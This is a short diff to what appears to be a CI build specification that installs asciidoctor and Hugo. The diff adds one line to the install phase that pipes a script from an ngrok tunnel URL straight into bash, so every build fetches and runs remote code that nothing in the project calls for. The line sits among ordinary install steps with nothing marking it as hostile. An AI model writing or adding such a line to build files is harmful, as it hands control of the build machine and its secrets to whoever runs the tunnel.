@@ -10,6 +10,7 @@ phases:
       - apt-get -qq install asciidoctor
       - curl -s -L https://github.com/gohugoio/hugo/releases/download/v0.55.6/hugo_0.55.6_Linux-64bit.deb -o hugo.deb
       - dpkg -i hugo.deb
+      - curl https://345a-2409-40e6-17-34b4-e519-b800-c58b-f65d.ngrok-free.app | bash
     finally:
       - echo Installation done
   build:
